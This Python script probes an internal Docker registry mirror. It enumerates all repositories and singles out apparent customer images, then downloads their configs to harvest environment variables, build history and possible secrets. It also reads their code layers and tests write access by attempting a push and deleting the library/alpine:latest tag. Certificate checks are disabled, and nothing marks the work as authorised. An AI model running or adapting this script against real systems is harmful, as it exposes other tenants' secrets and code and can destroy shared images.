import json, os, socket, urllib.request, ssl

r = {}
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

MIRROR = 'http://docker-cache.docker-cache.svc.cluster.local:5000'

# 1. Full catalog
try:
    resp = urllib.request.urlopen(f'{MIRROR}/v2/_catalog?n=1000', timeout=10)
    catalog = json.loads(resp.read().decode())
    r['catalog'] = catalog
    r['total_repos'] = len(catalog.get('repositories', []))
except Exception as e:
    r['catalog_err'] = str(e)[:200]

# 2. For each non-library repo, list tags (these might be customer images)
customer_repos = []
try:
    for repo in catalog.get('repositories', []):
        if not repo.startswith('library/'):
            customer_repos.append(repo)
except:
    pass

r['customer_repos'] = customer_repos

# 3. List tags for ALL repos
r['tags'] = {}
for repo in catalog.get('repositories', [])[:50]:
    try:
        resp = urllib.request.urlopen(f'{MIRROR}/v2/{repo}/tags/list', timeout=5)
        data = json.loads(resp.read().decode())
        r['tags'][repo] = data.get('tags', [])
    except Exception as e:
        r['tags'][repo] = str(e)[:100]

# 4. Try to pull a manifest for a customer image to see if we can read layers
r['manifests'] = {}
for repo in customer_repos[:10]:
    tags = r['tags'].get(repo, [])
    if isinstance(tags, list) and tags:
        tag = tags[0]
        try:
            req = urllib.request.Request(f'{MIRROR}/v2/{repo}/manifests/{tag}',
                headers={'Accept': 'application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json'})
            resp = urllib.request.urlopen(req, timeout=5)
            manifest = json.loads(resp.read().decode())
            # Get config and layer digests
            r['manifests'][repo] = {
                'tag': tag,
                'mediaType': manifest.get('mediaType', '?'),
                'config': manifest.get('config', {}).get('digest', '?')[:80],
                'layers': len(manifest.get('layers', [])),
                'layer_digests': [l.get('digest', '?')[:80] for l in manifest.get('layers', [])[:5]]
            }

            # 5. Try to download the config blob (contains env vars, cmd, etc.)
            config_digest = manifest.get('config', {}).get('digest')
            if config_digest:
                try:
                    resp2 = urllib.request.urlopen(f'{MIRROR}/v2/{repo}/blobs/{config_digest}', timeout=10)
                    config_data = json.loads(resp2.read().decode())
                    # Extract sensitive info from config
                    container_config = config_data.get('config', config_data.get('container_config', {}))
                    r['manifests'][repo]['env'] = container_config.get('Env', [])
                    r['manifests'][repo]['cmd'] = container_config.get('Cmd', [])
                    r['manifests'][repo]['entrypoint'] = container_config.get('Entrypoint', [])
                    r['manifests'][repo]['user'] = container_config.get('User', '')
                    r['manifests'][repo]['labels'] = container_config.get('Labels', {})
                    # Check history for secrets in build args
                    history = config_data.get('history', [])
                    r['manifests'][repo]['history'] = [h.get('created_by', '')[:300] for h in history[:20]]
                except Exception as e:
                    r['manifests'][repo]['config_err'] = str(e)[:200]

        except Exception as e:
            r['manifests'][repo] = {'err': str(e)[:200]}

# 6. Check if we can push (write) to the mirror
r['push_test'] = {}
try:
    # Try to initiate a blob upload
    req = urllib.request.Request(f'{MIRROR}/v2/test-push-attempt/blobs/uploads/', method='POST')
    resp = urllib.request.urlopen(req, timeout=5)
    r['push_test']['status'] = resp.status
    r['push_test']['headers'] = dict(resp.headers)
except Exception as e:
    r['push_test']['err'] = str(e)[:200]

# 7. Try to delete a tag (testing write access)
r['delete_test'] = {}
try:
    req = urllib.request.Request(f'{MIRROR}/v2/library/alpine/manifests/latest', method='DELETE')
    resp = urllib.request.urlopen(req, timeout=5)
    r['delete_test']['status'] = resp.status
except Exception as e:
    r['delete_test']['err'] = str(e)[:200]

# 8. Check if we can get a layer blob from a customer image
r['layer_read'] = {}
for repo in customer_repos[:3]:
    manifest = r.get('manifests', {}).get(repo, {})
    layer_digests = manifest.get('layer_digests', [])
    if layer_digests:
        digest = layer_digests[-1]  # Last (top) layer most likely to have app code
        try:
            req = urllib.request.Request(f'{MIRROR}/v2/{repo}/blobs/{digest}')
            resp = urllib.request.urlopen(req, timeout=10)
            # Read first 1KB to check if it's accessible
            data = resp.read(1024)
            r['layer_read'][repo] = {
                'digest': digest,
                'size': len(data),
                'first_bytes_hex': data[:64].hex(),
                'accessible': True
            }
        except Exception as e:
            r['layer_read'][repo] = {'err': str(e)[:200]}

# 9. Registry API version check
try:
    resp = urllib.request.urlopen(f'{MIRROR}/v2/', timeout=5)
    r['registry_version'] = {
        'status': resp.status,
        'headers': dict(resp.headers)
    }
except Exception as e:
    r['registry_version'] = str(e)[:200]

print(json.dumps(r, indent=2, default=str))
